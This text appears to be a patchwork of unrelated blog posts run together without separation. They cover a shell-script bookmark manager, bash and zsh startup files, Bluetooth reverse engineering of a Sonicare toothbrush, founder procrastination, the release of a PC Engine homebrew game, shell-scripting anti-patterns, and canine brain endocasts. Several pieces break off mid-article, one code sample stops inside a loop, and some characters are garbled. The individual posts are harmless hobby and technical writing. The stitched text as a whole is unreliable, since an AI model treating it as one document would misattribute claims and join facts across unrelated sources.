October 24, 2020 | https://www.samhh.com/blog/simpler-bookmarks/ | <a href="https://web.archive.org/web/*/https://www.samhh.com/blog/simpler-bookmarks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We all use the web, and we all use bookmarks. But did you know that you don’t have to use the bookmarking functionality built into your web browser?</p>
<p>This is why a while ago I migrated to <a href="https://github.com/jarun/buku">buku</a> and, at the time still pretty much living inside my web browser, I wrote <a href="https://github.com/samhh/bukubrow-webext">Bukubrow</a>. (I’m really creative at naming things as you can see!)</p>
<p>Any external bookmark manager is a ton better than using that which is built into your browser for one key reason - you’re no longer tied to a specific browser. Sure, you might (?) be able to import and export those bookmarks around, but it’s a hassle and not something I’d want to rely upon as browser vendors struggle to find reasons to differentiate, leaving platform lock-in increasingly tempting. I’m certain at one point it wasn’t possible at all, but I assume and hope that in the many years since things have improved.</p>
<p>You want to know something really annoying about buku? It’s written in Python. This means that, as the interpreter starts up on each <code>buku</code> invocation on the command-line, there’s a perceptible delay that isn’t present on any piece of software written in C, Rust, Go, Haskell, et cetera. (The same problem plagues JavaScript to an even worse extent.) It’s a terrible user experience. When you’re used to your terminal opening in mere milliseconds, this delay is extremely annoying. (Side note: If you’re running something like <a href="https://github.com/alacritty/alacritty">Alacritty</a> and your prompt isn’t ready virtually immediately then you’re probably using something like Oh My Zsh!, which butchers the startup time of the prompt.)</p>
<p>Something else annoying about Python is the state of its package management. People rag on JavaScript projects’ complex and slow build systems, but at least once it’s distributed the end user typically has a single bundled script to run, just as with the other languages I’ve mentioned you’d generally have a single binary. Seemingly not so with Python! Installation of buku is painful because it carries with it a bunch of dependencies I don’t care about. These are implementation details for the author, and they probably shouldn’t be updated independently on my system. Can you imagine if all software was like this? You’d barely be able to go five minutes on Arch without some sort of dependency (of a dependency of a dependency) update requiring an update. <a href="https://beets.readthedocs.io/en/stable/">beets</a>, also written in Python, as much as I love it, suffers these same issues.</p>
<p>This led me to wonder what alternatives are out there. After being broadly unsatisfied with what I found, and having spent a while really enjoying <a href="https://www.passwordstore.org/">pass</a>, I decided to roll my own solution. What started out as a vague idea to write a “simple” bookmark manager in Haskell a la pass resulted in a truly simple shell script. Introducing <a href="https://github.com/samhh/dotfiles/blob/bcb15d05274478d78b4eecb7f56dd813f15a9dbe/home/scripts/flatmarks.sh">flatmarks</a>, a script so simple it doesn’t even warrant its own project page.</p>
<p>This script depends upon only a single tool, <a href="https://github.com/davatorium/rofi">rofi</a>, something a lot of folks running Linux with tiling window managers will already be using. It could be trivially updated to use <a href="https://tools.suckless.org/dmenu/">dmenu</a> or something else that can handle the interactive aspect. All it does is recursively collect the name of every file in a specified directory, present them to the user, and open the first line of the selected file in the browser. (Okay, technically it could open other stuff too as it’s calling <code>xdg-open</code>, but I’m not sure what else you’d put here. Maybe links to <a href="https://gemini.circumlunar.space/">Gemini</a>?)</p>
<p>The bookmarks directory itself can be thought of in the same way as pass’ password repo, except it’s lacking encryption. I suppose that could be quite easily implemented as well if you felt that necessary.</p>
<p>What does this look like in practice? I have a directory <code>~/.bookmarks/</code>, managed by git and backed up to a private remote somewhere, within which I have all my bookmarks. Most of them live at the root, but some are organised inside subdirectories. If ever I delete something and want it back, it’s right there in my git history. I don’t need to do anything at all if I change web browser. When I want to open a bookmark, regardless of where I am, I open <a href="https://github.com/samhh/dotfiles/blob/0f25b2e7cf4ca26482221347afac0034fee9f921/home/xmonad-samhh/Main.hs#L273">the keybind defined in my window manager</a>, which’ll open it up in my web browser of choice, currently <a href="https://github.com/fanglingsu/vimb">vimb</a>. When I want to add a bookmark I simply pop it into the repo and, if I want to keep it around for more than just a brief period of time, I commit it.</p>
<p>It’s a little more upfront work but the end result, in my eyes, is a lot simpler. It’s more ergonomic and it’s far less hostile to customisation and change. That seems to be the tradeoff with a lot of technology, Linux on the desktop as another example. The same can be said for a lot of the other software I’ve mentioned in this post too. But it’s totally worth it.</p>
<p>For anyone still using Bukubrow, this is why there hasn’t been much activity. It’s not abandoned, but I also don’t have much impetus to work on it as I did before as I no longer use it myself. You, too, might find a bash script and a git repo to be superior to anything more proprietary anyway.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>
<p>Update (2020-03-29)</p>
<p>When I originally wrote this blog post, my intent was to describe how things
worked on a typical system at the time.
Unfortunately, the operation of bash startup scripts is dependent on
patches added by OS distributions, compile-time options and if bash thinks
it was invoked by sshd or rshd.
I have no desire to add complexity to this post, so instead please
read this as a rough approximation of the truth.
If you want to know for certain how it works on your system, the only answer
is <em>test it yourself</em>.</p>
</div>
<p>If you’re a regular shell user, you’ve almost certainly got a
<tt>.bash_profile</tt> or <tt>.bashrc</tt> script in your home folder,
which usually contains various tweaks, such as setting environment variables
(adding that directory to <tt>$PATH</tt>), telling your shell to do clever things
(like <tt>set <span>-o</span> noclobber</tt>) and adding various aliases to commands
(like <tt>alias please=sudo</tt>).</p>
<p>(If you’re really organised, you’ll have all your dotfiles in a repository
somewhere so that you can keep your settings synchronised across all the
machines you work on.)</p>
<p>Anyhow, I suspect that few people know when things like <tt>.bash_profile</tt> and
<tt>.bashrc</tt> actually get executed. When I started, I just followed people’s
advice of putting stuff in <tt>.bashrc</tt>, and then when it didn’t work, into
<tt>.bash_profile</tt>.
I could stop here and describe just the bash startup process (as silly as it
is), but there’s a complication in that I switched to zsh a few years ago
(and haven’t looked back), but occasionally use bash on machines which don’t
have zsh installed.</p>
<p>In order to handle this nicely then, I need to be able to specify things which
are specific to bash or zsh in their own files, and then to specify things
which any POSIX-compliant shell (like aliases and environment variables) can
understand in a common startup file.</p>
<p>My solution to this problem is to define some new dotfile folders,
one for each shell (<tt>.bash/</tt>, <tt>.zsh/</tt> and <tt>.sh/</tt>), and one for the
shell-independent files (<tt>.shell/</tt>):</p>
<div><pre><span></span>.bash/
    env
    interactive
    login
    logout
.sh/
    env
    interactive
    login
.shell/
    env
    interactive
    login
    logout
.zsh/
    env
    interactive
    login
    logout
</pre></div>
<p>“But!”, you say, <a href="#since" id="id1">[1]</a> “what do the different files in here do?”
Ah, well I’m glad you asked.
There are two kinds of shells:</p>
<ul>
<li>[non-]interactive shells (you type into them / shell scripts)</li>
<li>[non-]login shells (the shell run when you first login / subshells)</li>
</ul>
<p>All shells will first run <tt>env</tt>, then login shells will run <tt>login</tt>,
then interactive shells will run <tt>interactive</tt>.
Once finished, login shells will run <tt>logout</tt>.</p>
<div id="where-to-put-stuff">
<h2>Where to put stuff</h2>
<p>It all depends on when it needs to be run.</p>
<p>If it’s setting / modifying environment variables, it should go in <tt>login</tt>.
If it’s alias or a terminal-specific environment variable (e.g., GREP_COLOR),
it should go in <tt>interactive</tt>.
In my <tt>.shell/env</tt> file, I have my umask set, and also define some useful
functions for modifying colon-separated path environment variables (like
$PATH).</p>
<p>Even if you don’t adopt anything else from my scheme, I’d recommend you take a
look at the what my functions are doing which differs from something like
<tt>export <span>PATH=$PATH:/path/to/dir</span></tt>.</p>
<p>That particular pattern is way too common, and is very dangerous if you
consider the case when <tt>$PATH</tt> (or whatever your variable is, like
<tt>$LD_LIBRARY_PATH</tt>) isn’t set.
Then, the value will be <tt>:/path/to/dir</tt>, which usually means both
<tt>/path/to/dir</tt> <em>and the current directory</em>, which is usually both unexpected
behaviour and a security concern.</p>
<p>With my implementation (see <tt>.shell/env_functions</tt>), you can append, prepend
and remove directories from any colon-separated environment variable, and when
appending or prepending, you are guaranteed that directory will only then
appear in that variable once.</p>
<p>As a side note, I’m very disappointed in my <tt>indirect_expand()</tt> function,
so if you have a better solution, please let me know (or send me a pull request).</p>
</div>
<div id="implementation">
<h2>Implementation</h2>
<p>In order to implement this, you first need an understanding of which startup
files are run in each case.
Of course, this isn’t hard, since all the shells have the same, sensible
system. Ahahaha, no.</p>
<p>Fortunately, I’ve read the man pages for you, and drawn a pretty diagram.
To read it, pick your shell, whether it's a login shell, whether it's
interactive, and follow the same colour through the diagram.
When the arrows split out to multiple files, it means that the shell will try
to read each one in turn (working left to right), and will use the first one it
can read.</p>
<p><img alt="" src="https://blog.flowblok.id.au/static/images/shell-startup.png"></p><p>An important point here is that if you have a non-login, non-interactive shell
running a plain POSIX shell (dash, bash in sh compatibility mode), it <em>won’t
fulfil</em> our contract in that it won’t read <tt>.sh/env</tt>
(and hence <tt>.shell/env</tt>).</p>
<p>The other special case which exists is Bash’s remote shell mode (which is
rather warped), where it tries to detect if it’s running under ssh or rsh (I
assume by looking at the process name of its parent), and if so, follows a
different path, which is indicated on the diagram.</p>
<p>Except that diagram shows what happens according to the man page, and not what
happens when you actually try it out in real life.
This second diagram more accurately captures the insanity of bash:</p>
<p><img alt="" src="https://blog.flowblok.id.au/static/images/shell-startup-actual.png"></p><p>See how remote interactive login shells read /etc/bash.bashrc, but normal
interactive login shells don’t? Sigh.</p>
<p>Finally, <a href="http://hg.flowblok.id.au/shell-startup">here’s a repository</a> containing my implementation and the graphviz
files for the above diagram.
If your POSIX-compliant shell isn’t listed here, or if I’ve made a horrible
mistake (or just a tiny one), please send me a pull request or make a comment
below, and I’ll update this post accordingly.</p>

            <p>Since a few month I own an electrical toothbrush from Phillips called <a href="https://www.google.com/search?q=Sonicare+HX992B">Sonicare HX992B</a>. It connects to <a href="https://play.google.com/store/apps/details?id=com.philips.cdp.ohc.tuscany" title="App">an mobile App</a> using Bluetooth that tells you how well you brushed your teeth, shows the orientation in real-time, and also notifies you when to change the brush for a new one.</p>
            <p><img src="https://blog.johannes-mittendorfer.com/assets/img/sonicare-image.jpeg" alt="Phillips Sonicare"></p>
            <p>I was curious how this exactly works. Since the application uses Bluetooth Low Energy (BLE), I used the <a href="https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp">nRF Connect</a> app for Android to get a list of advertised services.</p>

            <p>Now I had a list of 12 BLE services of which only four are <a href="https://www.bluetooth.com/de/specifications/gatt/" title="List of common services">standard services described on bluetooth.com</a>. In addition to well-known services like Generic Access, Generic Attribute, Device Information and Battery Service, also eight custom services exist, that were created by the manufacturer. Every one of the first seven service UUIDs starts with <code>477ea600-a260-11e4-ae37-0002a5d5000</code> and ends with a number from 1 to 8 with number 3 missing. An additional eight service has a completely different prefix than the others.</p>

            <p>By switching the device on and off, changing the strength and mode and also by changing the brush back and forth, I was able to identify some of the characteristics of the six services. By reverse engineering the code of the Android app using <a href="https://github.com/skylot/jadx">jadx</a> I found information about the session storage and many other things.</p>

            <p>According to the application sources, the last unknown service is called “Moonshine Streaming” and is used to update the firmware. I agreed with myself to not touch this one, since I could damage the firmware and would need to brush my teeth by hand again.</p>
            <p>Since I could see a very course orientation displayed in the app during a cleaning session, I expected orientation data somewhere in the characteristics. I found them in the service <code>5</code>. Once you enable notifications for the <code>4130</code> service, you get a data stream to byte arrays. It turns out, these are indeed the values of the gyroscope.</p>

            <p>I created a python library to interface with the toothbrush in Python. Feel free to experiment, find the meaning of the missing services and submit pull requests: <a href="https://github.com/joushx/python-sonicare">https://github.com/joushx/python-sonicare</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>If you are an indie hacker or a solo founder, you probably realize that you have to wear many hats and simultaneously juggle many balls. Building and running a successful business requires you to be a developer, a marketer, customer support, and everything else that a business may need to survive.&nbsp;<br></p><p>But let me ask you a question. Of all those hats I mentioned, which one you wear the most? Well, if you have a technical background and know-how to code -like myself-, I bet it's the developer's hat. If you are aware of this and don't mind, simply because you enjoy coding and building a profitable business is not your highest priority, you probably don't need to read the rest of this article.<br></p><p>However, if profitability&nbsp;<strong>is</strong>&nbsp;your priority, but coding still takes +90% of your time, then maybe it's worth pausing for a minute to ask yourself, why? For me, that's the case. Coding takes a big chunk of my time. I enjoy coding, and I'm good at it. So it seems like spending my time coding is a "choice", at least, this is what I thought.<br></p><p>Last week, after <a href="https://www.jamalx31.com/sunday-tldr/themed-days">implementing themed days (newsletter email)</a>, I set a deadline for myself on Saturday to post on Reddit to promote my startup, Hatchy. I procrastinated on that for two weeks by then, so I promised myself that I would post no matter what, and I won't care if the product was ready.<br></p><p>Saturday came, and I kept my promise. I posted, and I received some excellent feedback, but also some critics. That's normal; what was interesting to me is the feeling I had every time I opened Reddit or IndieHackers to check the comments. I felt sick, stressed like I'm about to go naked on stage to deliver a speech. It's my fear of public embarrassment. That bit was kind of clear to me, but what it has to do with coding? I didn't make the connection straight away, but later on I&nbsp;read this:&nbsp;<br></p><blockquote>As Voltaire once wrote, "The best is the enemy of the good."<p>I refer to this as the difference between being in motion and taking action. The two ideas sound similar, but they're not the same. When you're in motion, you're planning and strategizing and learning. Those are all good things, but they don't produce a result.</p><p>Action, on the other hand, is the type of behavior that will deliver an outcome. If I outline twenty ideas for articles I want to write, that's motion. If I actually sit down and write an article, that's action. If I search for a better diet plan and read a few books on the topic, that's motion. If I actually eat a healthy meal, that's action.</p><p>Sometimes motion is useful, but it will never produce an outcome by itself. It doesn't matter how many times you go talk to the personal trainer, that motion will never get you in shape. Only the action of working out will get the result you're looking to achieve.</p><p>If motion doesn't lead to results, why do we do it? Sometimes we do it because we actually need to plan or learn more. But more often than not, we do it because motion allows us to feel like we're making progress without running the risk of failure. Most of us are experts at avoiding criticism. It doesn't feel good to fail or to be judged publicly, so we tend to avoid situations where that might happen.&nbsp;<strong>And that's the biggest reason why you slip into motion rather than taking action: you want to delay failure.</strong>" </p><p>- Atomic Habits, James Clear</p></blockquote><p>‍</p><p>It was the "aha!" moment. Coding is my motion. It's easy to be in motion and convince yourself that you're still making progress. You keep adding new features, fixing bugs, and re-styling your landing page, thinking to yourself how much progress you made. When I fact, you are just procrastinating on all the other important stuff.&nbsp;<br></p><p>In August, Chris McCormick shared a shocking post on IndieHackers.&nbsp;<a href="https://www.indiehackers.com/post/holy-heck-this-is-hard-8ebe864174" target="_blank">Only ~1% of 17,207 people who have joined Indie Hackers makes more than $2k MRR</a>. Of course, the data is not 100% accurate, but that doesn't discard that it's so hard and takes a long time for a solo founder to build a sustainable business. But maybe there is more to that than just the fact it's hard.<br></p><p>What if you are stuck on the "coding wheel"? What if it's taking so long not only because it takes time to build but also because you systematically slip into motion rather than taking action? What if you keep yourself busy coding to delay failure and, as a result, delay success?</p><p>‍</p></div></div>]]>

  <div itemprop="articleBody">
    <p>So, the adventure started in <a href="https://nicole.express/2020/personal-computer-engine.html">July</a> has come to an end. How did the project go? Where can I get the game?  Do I need a <a href="https://nicole.express/2020/super-grafx-cd.html">SuperGrafx CD</a> with dual <a href="https://nicole.express/2020/why-do-you-need-an-arcade-card.html">Arcade Cards</a> to play it? Will this give me a totally accurate understanding of quantum field theory? All your questions and more will be answered! Plus, stay tuned for a follow-up on coding for the PC Engine!</p>

<h2 id="its-here">It’s here!</h2>

<p><img src="https://nicole.express/assets/img/ava201/title.jpg" title="All images captured by Framemeister over RGB" alt="The title screen of Space Ava 201, a female figure looming ominously over a flat earth"></p>

<p>Like all of my games that I feel confident enough in to release there, <em>Space Ava 201</em> is now available on my <a href="https://nicole-express.itch.io/">itch.io</a> page, <a href="https://nicole-express.itch.io/space-ava-201">right here</a> to be precise. You can download it freely in CUE/ISO/WAV format, or throw some pennies at the author if you really want. (She even has a <a href="https://www.patreon.com/nicole_express">Patreon</a>! Okay, enough self-promotion)</p>

<p><img src="https://nicole.express/assets/img/ava201/level1.jpg" title="We're in space!" alt="An in-game screenshot of Space Ava 201, showing Ava on a space station"></p>

<p>Any TurboGrafx-16 or PC Engine emulator that can play Super CD-ROM<sup>2</sup> games can play <em>Space Ava 201</em>. You don’t need to configure things for the Arcade Card or the SuperGrafx; you can get a full gameplay experience with all levels, dialogue, and music still available without either of those. This goes for playing on hardware as well.</p>

<p><img src="https://nicole.express/assets/img/supergfx/spaceava-cover.png" title="Inspired by the Griffiths quantum mechanics textbook I used in college" alt="The cover of Space Ava 201, featuring a PC-SG logo"></p>

<h3 id="faq-and-more-screenshots">FAQ (and more screenshots!)</h3>

<h4 id="will-it-run-on-a-real-console">Will it run on a real console?</h4>

<p><img src="https://nicole.express/assets/img/ava201/dialogue.jpg" title="Space Academia" alt="A screenshot of Space Ava 201, wherein Cindy Palisade insists that because she's the captain, she gets to be first author"></p>

<p>I have personally tested this on my own PC Engine Duo R and SuperGrafx-CD setups using a burned CD-R, and found it worked successfully, if your console supports CD-Rs in general. (My Turbo Duo does not) I have also tested using the TerraOnion Super SD System 3 (an FPGA-based CD-ROM drive emulator) without issues.</p>

<p>I do not have any other systems to test on, but I see no reason they wouldn’t also work equally well. Of course, these systems being potentially over thirty years old, I can’t make any promises. Everything’s at your own risk, folks…</p>

<h4 id="how-does-it-handle-composites-video">How does it handle composite/S-Video?</h4>

<p><img src="https://nicole.express/assets/img/ava201/composite.jpg" title="A screenshot that is relevant to the question" alt="A screenshot of Space Ava 201, over composite video"></p>

<p>Recently, the retro community has been <em>rocked</em> by the revelation that the PC Engine/TurboGrafx’s video output palette is in some cases noticeably different between RGB output and composite video. Since most systems only offered composite outputs, this has raised a lot of questions over what the “correct” way to play games is.</p>

<p>To set the record straight for this game: I designed all graphics and tested using primarily the more vivid RGB colors. But if you do prefer the more muted composite or S-Video color palette, it’ll look good there too, I’ve run through the game that way to make sure. Play it any way you want! Even use one of those smoothing filters if you want.</p>

<h4 id="do-i-need-to-have-played-space-ava">Do I need to have played <em>Space Ava</em>?</h4>

<p><img src="https://nicole.express/assets/img/ava201/standoff.jpg" title="You Vs. Boo" alt="A screenshot of Space Ava 201, wherein Ava stands facing a villainous quantum goon"></p>

<p>Hopefully, no. This game is predominately about gameplay, and therefore the story is primarily comedic and intended to provide a break between segments. While many characters from the first game reappear, they’re not heavily characterized and it should be possible to enjoy the game fully without having played the first one.</p>

<p>That being said, you could <a href="https://nicole-express.itch.io/space-ava">just play the first one</a>. It’ll run in your web browser! And it has <em>isometric</em>.</p>

<h4 id="what-are-the-controls">What are the controls?</h4>

<p><img src="https://nicole.express/assets/img/ava201/antonia.jpg" title="Antonia knows the controls but won't tell you them" alt="A screenshot of Space Ava 201, wherein Ava is confronted by Antonia, a woman in a blue beret"></p>

<p><em>Space Ava 201</em> is predominately played with the directional pad. You’ll find no benefit from the Turbo Pad, Avenue Pad 6, Turbo Tap, or other specialty controllers, but you can use them if you want.</p>

<p>In <strong>standard gameplay</strong>:<br>D-PAD: Move Ava<br>RUN: Pause<br>SELECT: Kill Ava (restart level)</p>

<p>In <strong>dialogue screens</strong>:<br>Button I: Progress further in dialogue<br>RUN: Skip dialogue</p>

<p>In <strong>mirror puzzles</strong>:<br>D-PAD: Move cursor<br>Button I: Pick up and drop movable items<br>RUN: Attempt to solve puzzle</p>

<p>In <strong>side-scrolling segments</strong>:<br>D-PAD: Move Ava<br>Button I: Jump (can also use D-pad UP)<br>RUN: Pause</p>

<h4 id="how-long-does-the-game-take">How long does the game take?</h4>

<p><img src="https://nicole.express/assets/img/ava201/mazeoffice.jpg" title="The most powerful force in the Amalgamation of Worlds: Bureaucracy" alt="A screenshot of Space Ava 201, wherein Ava in an office building"></p>

<p>Playing through it myself, it takes a little under an hour to complete. Of course, I’m already aware of the solutions to puzzles, so I would recommend leaving a little more time than that, but overall it’s not a very long game.</p>

<h4 id="what-do-the-supergrafx-and-arcade-card-do">What do the SuperGrafx and Arcade Card do?</h4>

<p><img src="https://nicole.express/assets/img/ava201/supertitle.jpg" title="Super Ava vs. Capcom" alt="A screenshot of Space Ava 201 running with enhanced SuperGrafx features used to write SUPER behind the title"></p>

<p>The SuperGrafx is primarily used to provide additional graphical layers in some game modes. These are used to create more interesting backgrounds. Nevertheless, it is not required for any action. You can see more details about this on my prior article about the SuperGrafx-CD.</p>

<p><img src="https://nicole.express/assets/img/ava201/arcadetitle.jpg" title="Wow you added some text, aren't you cool" alt="A screenshot of Space Ava 201 running with the Arcade Card says 'Arcade' under the title"></p>

<p>The Arcade Card, if available, is used to preload all graphics at the start of the game for faster loading. However,  this is only faster if you’re doing a long play session that will actually use those graphics; should you decide you not want to sit through the preload, you can always press and hold RUN. Eventually, the images of the Arcade Card on-screen will change to Super System Cards, showing that you have skipped the pre-loading. The game will from then on run identically as if you hadn’t used the Arcade Card at all.</p>

<p><img src="https://nicole.express/assets/img/ava201/noarcade.jpg" title="Lily's so disappointed though" alt="A screenshot of Space Ava 201 showing Lily sad that you aren't using the arcade card"></p>

<p>All modes of the game, even the standard mode, will access the Backup RAM, if available, to save game progress. Only one game save is available.</p>

<h4 id="what-are-the-licenses">What are the licenses?</h4>

<p><img src="https://nicole.express/assets/img/ava201/neptune.jpg" title="This stage looks different if you have a SuperGrafx..." alt="A screenshot of Space Ava 201 showing a side-scrolling mode on a blue planet"></p>

<p>That being said, if you do take anything, let me know! My email is listed below, or you could just ping me on @nicole_express on Twitter.</p>

<h4 id="are-there-cheat-codes">Are there cheat codes?</h4>

<p><img src="https://nicole.express/assets/img/ava201/4cheats.jpg" title="How many times are we going to see this damn title screen" alt="A screenshot of Space Ava 201 showing more options on the title screen, because the cheat codes below were used"></p>

<p>Of course there are! Press these on the title screen:</p>

<ul>
  <li>Up-Down-Left-Right: Access story mode (allows progress through dialogue without gameplay getting in the way)</li>
  <li>Right-Down-Up-Right-Right-Down-Right-Right-Up-Up-Down-Down-Left-Right-Left-Right: Access the level select</li>
</ul>

<p>That last code is a <a href="https://www.nicovideo.jp/watch/sm21249768">reference</a> to something… might help you remember the code, if you speak Japanese anyway.</p>

<h4 id="are-you-going-to-make-a-physical-release-available">Are you going to make a physical release available?</h4>

<p><img src="https://nicole.express/assets/img/ava201/mirror.jpg" title="Boingy boingy" alt="A screenshot of Space Ava 201 showing mirror puzzle mode, which is aesthetically similar to Windows 95 for some reason"></p>

<p>I am definitely going to get some CDs pressed at some point. (If for no other reason, then to run it on my Turbo Duo!) However, I have little interest in selling copies myself due to the logistics involved; if there is demand I might reconsider this, since CDs generally need to be pressed in bulk anyway.</p>

<p><img src="https://nicole.express/assets/img/ava201/superneptune.jpg" title="See now this is what I'm talking about" alt="A screenshot of Space Ava 201 showing a sidescrolling mode, enhanced to have a scrolling background using the SuperGrafx"></p>

<h2 id="coding-for-the-pc-engine-part-2">Coding for the PC Engine, Part 2</h2>

<p>So back in July I wrote up a blog post on coding for the PC Engine; deliberately, I did this before I had written much code at all. So let’s see how that turned out!</p>

<h3 id="errata">Errata</h3>

<ul>
  <li>I claimed that the PC Engine used a shift register for the controller and is read serially (one-byte-at-a-time) like the NES controller. This isn’t accurate; the PC Engine can actually read four of the eight buttons at once.</li>
  <li>I claimed the Sprite Attribute Table doesn’t live in VRAM; this is and isn’t true: there is actually a portion of VRAM attributed to sprites, which is DMA’d into the internal SATB. So if you go trampling around all of VRAM, you will overwrite your sprites. It’s a pretty small region, though.</li>
</ul>

<p>Neither of these are huge errors, but they are worth pointing out.</p>

<h3 id="using-huc">Using HuC</h3>

<p>I was very impressed with the HuC compiler. I ended up being able to write pretty much everything in a performant fashion without too much issues; in the end, the only things I needed to reach outside of HuC for were to use block transfer instructions (and more on those later)</p>

<p>Of course, the fact that <em>Space Ava</em> is not in any sense of the word an action game probably helps.</p>

<p>There are some oddities which are definitely worth noting. For one thing, I couldn’t get the included <code>malloc</code> implementation to work, but in the end I don’t think it’s necessary. I found it fine to declare all blocks of memory you need for the overlay up-front; after all, the best garbage collection method is to just leave it all lying around.</p>

<p>Additionally, in standard programming, global variables are generally to be avoided, but in HuC they’re very useful to use– local variables are kept on a stack kept in RAM. The downside of this is that this isn’t the processor stack (as a 6502-based processor, the HuC6280 inherits its very limited 8-bit stack), so there’s a lot of overhead involved. Global variables are directly mapped to RAM addresses and are very fast.</p>

<p>As I also noted in my original article, I pretty much entirely ignored HuC/Magic Kit’s image processing methods and wrote my own. They’re very heavily tied to my <a href="https://github.com/nicolebranagan/terraformer">Terraformer</a> homebrew graphics editor which as far as I know no one else uses, but my routines are included in the source code if you’d like to take a look, written in Python 3.</p>

<p>Since these processing routines put all the images in a single “overlay” (you can think of an overlay as a file on the disk), it was trivial to add Arcade Card support by uploading the entire overlay into the card, and doing a quick check whenever VRAM would be loaded to bypass the CD-ROM drive if the Arcade Card was populated.</p>

<p><img src="https://nicole.express/assets/img/ava201/arcadeloader.jpg" title="I love using this retro mode" alt="A screenshot of Space Ava 201 showing data being loaded into the arcade card"></p>

<p>Let’s talk about those “overlays” more. An overlay seems to be basically a rough placeholder for a file system; there are “data” overlays which basically are just a pointer to a place on the CD, and “executable” overlays that are programs that are designed to be loaded into the Super System Card. This is all a HuC system, and there’s no reason to assume all PC Engine CD games work this way. In general, though, I found this made it pretty easy to break out multiple game modes into their own programs in a much cleaner way than, say, <a href="https://nicole.express/2019/making-of-aspect-star-n-coding.html"><em>Aspect Star “N”</em></a>, where even the title screen was just another mode of the game.</p>

<h3 id="the-block-transfer-instructions">The block transfer instructions</h3>

<p>In my initial blog post, I neglected them entirely. In my <a href="https://nicole.express/2020/supergrafx-cd.html">SuperGrafx-CD</a> blog post, I did block transfers using C! So what are these instructions?</p>

<ul>
  <li><code>tai</code> - Transfer Alternate Increment</li>
  <li><code>tia</code> - Transfer Increment Alternate</li>
  <li><code>tdd</code> - Transfer Decrement Decrement</li>
  <li><code>tii</code> - Transfer Increment Increment</li>
  <li><code>tin</code> - Transfer Increment None</li>
</ul>

<p>Sounds like a mess of alphabet soup, doesn’t it? I certainly thought so, which is why I just ignored them. But these are actually great for copying data back and forth. And what’s all this about Alternating? For example, let’s take this code sample from the SuperGrafx-CD article:</p>

<pre>sgx_load_vram(int vaddr, int *data, int nb)
{
    int i;

    poke(0x10, 0x00);   // Initialize VRAM address
    pokew(0x12, vaddr);
    poke(0x10, 0x02);   // Enter write mode

    for (i = 0; i &lt; (nb &gt;&gt; 1); i++)
    {</pre></div></article></div></div></div>

<p>You won't go to hell for these, but you should probably look at the manpage. Some programs are just limited, but hey, you can't expect every program to provide a printf function, a date formatter and handling of input from stdin.</p>

<h2 id="Undeclarative%20%3Ccode%3Egrep%3C/code%3E">Undeclarative <code>grep</code></h2>

<p><code>grep</code> is a true power tool in Unix, but can be abused. Here is an example (by me ðŸ˜®):</p>

<p><code>date --date="$(stat "$4/${i%\.html}.md" | grep Modify | cut -d':' -f2-</code></p>

<p>Poor old skuzzymiglet then had no idea about <code>stat --printf</code>, which has useful options for printing times:</p>

<pre><code>%w     time of file birth, human-readable; - if unknown
%W     time of file birth, seconds since Epoch; 0 if unknown
%x     time of last access, human-readable
%X     time of last access, seconds since Epoch
%y     time of last data modification, human-readable
%Y     time of last data modification, seconds since Epoch
%z     time of last status change, human-readable
%Z     time of last status change, seconds since Epoch
</code></pre>

<p>The human-readable dates are fixed-format, so you can just <code>date "your_cool_format" --date="@$(stat --printf="%Y" whatever_you_want)"</code></p>

<p>Generally, a <code>printf</code> like option is useful in programs - it discourages scraping and greatly shortens pipe sequences. But alas, most programs will need to be grepped.</p>

<h2 id="Functions">Functions</h2>

<p>It sounds weird but I believe functions are a shell code smell. The problem is that with a function, you expect paramater names (and types if you're a reasonable person ðŸ˜€). However, you'll find it's just like command-line arguments, and if you don't have the time to use <strong>getopt(1)</strong>, you'll be addressing by index.</p>

<p>Or you could just reassign to variables:</p>

<p><em>(from <a href="https://www.romanzolotarev.com/ssg.html">ssg5</a>)</em></p>

<pre><code>render_sitemap() {
    urls="$1"
    base_url="$2"
    date="$3"

    echo '&lt;?xml version="1.0" encoding="UTF-8"?&gt;'
    echo '&lt;urlset'
    echo 'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"'
    echo 'xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9'
    echo 'http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd"'
    echo 'xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt;'
    echo "$urls" |
        sed -E 's#^(.*)$#&lt;url&gt;&lt;loc&gt;'"$base_url"'/\1&lt;/loc&gt;&lt;lastmod&gt;'"$date"'&lt;/lastmod&gt;&lt;priority&gt;1.0&lt;/priority&gt;&lt;/url&gt;#'
    echo '&lt;/urlset&gt;'
}
</code></pre>

<p>But who would use this?</p>

<pre><code>func render_sitemap(params []string)
</code></pre>

<p>I consider shell function with more than one parameter a contributor to write-only code.</p>

<h2 id="Multiple%20text%20processors">Multiple text processors</h2>

<p>The text processor hierarchy follows:</p>

<ul>
<li>single-purpose: <code>cut</code>, <code>tr</code>, <code>nl</code>, <code>sort</code>, <code>grep</code></li>
<li>flat: regexes and sed</li>
<li>text DSLs: Awk</li>
<li>scripting languages: Python, Perl</li>
</ul>

<p>Generally, you should use <strong>one</strong> and only one of those specified above. Start with the lower-down tool, then instead of adding a command to the pipe use a higher-tier text processor.</p>

<p>In pipes, programming languages get out of hand quickly. Putting everything in quotes and no syntax highlighting is difficult.</p>

<p><em>This list will probably get a few updates in the future. For now, happy scripting!</em></p>

                        </p><div>
        <address>Based on digital endocranial cast models the canine brain does not increase proportionally with body size. Researchers at ELTE Eötvös Loránd and Kaposvár University in Hungary reconstructed the surface morphology of 28 canine brains, including various dog breeds, wolves, coyotes, and jackals. The shortening of the facial skeleton greatly influences the ratio of certain brain regions, primarily the olfactory bulb and the frontal lobe. These changes might have profound implications for olfactory and problem-solving abilities.</address>

<p>Reconstructing the brain based on the internal surface patterns of a skull is a well-known method among archeologists studying the brains of extinct species, e.g.&nbsp; dinosaurs, mammoths and even cavemen. One way to achieve a model of the brain is to fill the endocranial space with specific gradually hardening fluids, and after the solidifying of the material the bones can be removed to reveal the cast, which reflects the surface of the brain with high fidelity. These are called endocranial casts, or endocasts.</p>

